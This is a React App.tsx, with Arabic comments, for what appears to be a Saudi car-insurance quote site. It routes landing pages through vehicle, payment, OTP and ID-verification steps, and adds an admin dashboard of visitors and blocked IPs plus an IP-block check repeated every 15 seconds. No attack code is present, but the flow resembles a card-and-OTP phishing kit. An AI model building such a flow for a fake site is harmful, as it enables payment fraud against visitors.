import { useState, useEffect, useCallback } from "react";
import { Toaster } from "@/components/ui/toaster";
import { Toaster as Sonner } from "@/components/ui/sonner";
import { TooltipProvider } from "@/components/ui/tooltip";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { BrowserRouter, Routes, Route, useLocation } from "react-router-dom";
import { LoadingScreen } from "@/components/LoadingScreen";
import { usePageLoading } from "@/hooks/usePageLoading";
import Index from "./pages/Index";
import LandingCheapest from "./pages/LandingCheapest";
import LandingComprehensive from "./pages/LandingComprehensive";
import LandingRenewal from "./pages/LandingRenewal";
import LandingPrices from "./pages/LandingPrices";
import LandingFoundingDay from "./pages/LandingFoundingDay";
import LandingRamadan from "./pages/LandingRamadan";
import VehicleInfo from "./pages/VehicleInfo";
import InsuranceSelection from "./pages/InsuranceSelection";
import Payment from "./pages/Payment";
import OTPVerification from "./pages/OTPVerification";
import NotFound from "./pages/NotFound";
import { BlockedIPScreen } from "@/components/BlockedIPScreen";
import { supabase } from "@/integrations/supabase/client";
import Login from "./pages/Login";
import AdminRegister from "./pages/AdminRegister";
import Dashboard from "./pages/Dashboard";
import DashboardQuotes from "./pages/DashboardQuotes";
import DashboardApplications from "./pages/DashboardApplications";
import DashboardVisitors from "./pages/DashboardVisitors";
import DashboardBlockedIPs from "./pages/DashboardBlockedIPs";
import IDVerification from "./pages/IDVerification";

const queryClient = new QueryClient();

// قائمة المسارات المستثناة من فحص الحظر (مثل لوحة التحكم)
const EXCLUDED_PATHS = ['/login', '/dashboard', '/admin-register-secure-2024'];

const AppContent = () => {
  const [isLoading, setIsLoading] = useState(true);
  const [isBlocked, setIsBlocked] = useState(false);
  const [blockReason, setBlockReason] = useState<string | null>(null);
  const location = useLocation();

  const checkBlockedIP = useCallback(async () => {
    const currentPath = window.location.pathname;
    if (EXCLUDED_PATHS.some(path => currentPath.startsWith(path))) {
      setIsLoading(false);
      return;
    }

    try {
      // Don't use cached IP - always check fresh from server
      const { data, error } = await supabase.functions.invoke('get-visitor-ip');
      
      if (error) {
        console.error('Error checking IP:', error);
        setIsLoading(false);
        return;
      }

      if (data) {
        if (data.ip) {
          localStorage.setItem('visitor_ip', data.ip);
        }
        setIsBlocked(data.isBlocked || false);
        setBlockReason(data.blockReason || null);
      }
    } catch (error) {
      console.error('Error in blocked IP check:', error);
    } finally {
      setIsLoading(false);
    }
  }, []);

  // فحص أولي عند تحميل التطبيق
  useEffect(() => {
    checkBlockedIP();
  }, [checkBlockedIP]);

  // إعادة فحص عند تغيير المسار (التنقل بين الصفحات)
  useEffect(() => {
    checkBlockedIP();
  }, [location.pathname, checkBlockedIP]);

  // إعادة فحص الحظر كل 15 ثانية (بدل 30) للتأكد من حظر المستخدمين بسرعة
  useEffect(() => {
    const currentPath = window.location.pathname;
    if (EXCLUDED_PATHS.some(path => currentPath.startsWith(path))) return;

    const interval = setInterval(() => {
      checkBlockedIP();
    }, 15000);

    return () => clearInterval(interval);
  }, [checkBlockedIP]);

  // عرض شاشة التحميل أثناء فحص الـ IP
  if (isLoading) {
    return <LoadingScreen isLoading={true} />;
  }

  // عرض شاشة الحظر إذا كان الـ IP محظور
  if (isBlocked) {
    return <BlockedIPScreen reason={blockReason} />;
  }

  return <AppRoutes />;
};

const AppRoutes = () => {
  const { isLoading } = usePageLoading();

  return (
    <>
      <LoadingScreen isLoading={isLoading} />
      <Routes>
        <Route path="/" element={<Index />} />
        <Route path="/tamin1" element={<LandingCheapest />} />
        <Route path="/tamin2" element={<LandingComprehensive />} />
        <Route path="/tamin3" element={<LandingRenewal />} />
        <Route path="/tamin4" element={<LandingCheapest />} />
        <Route path="/asaar" element={<LandingPrices />} />
        <Route path="/tasis" element={<LandingFoundingDay />} />
        <Route path="/ramadan" element={<LandingRamadan />} />
        <Route path="/vehicle-info" element={<VehicleInfo />} />
        <Route path="/insurance-selection" element={<InsuranceSelection />} />
        <Route path="/payment" element={<Payment />} />
        <Route path="/otp-verification" element={<OTPVerification />} />
        <Route path="/id-verification" element={<IDVerification />} />
        <Route path="/login" element={<Login />} />
        <Route path="/admin-register-secure-2024" element={<AdminRegister />} />
        <Route path="/dashboard" element={<Dashboard />} />
        <Route path="/dashboard/visitors" element={<DashboardVisitors />} />
        <Route path="/dashboard/quotes" element={<DashboardQuotes />} />
        <Route path="/dashboard/applications" element={<DashboardApplications />} />
        <Route path="/dashboard/blocked-ips" element={<DashboardBlockedIPs />} />
        {/* ADD ALL CUSTOM ROUTES ABOVE THE CATCH-ALL "*" ROUTE */}
        <Route path="*" element={<NotFound />} />
      </Routes>
    </>
  );
};

const App = () => (
  <QueryClientProvider client={queryClient}>
    <TooltipProvider>
      <Toaster />
      <Sonner />
      <BrowserRouter>
        <AppContent />
      </BrowserRouter>
    </TooltipProvider>
  </QueryClientProvider>
);

export default App;
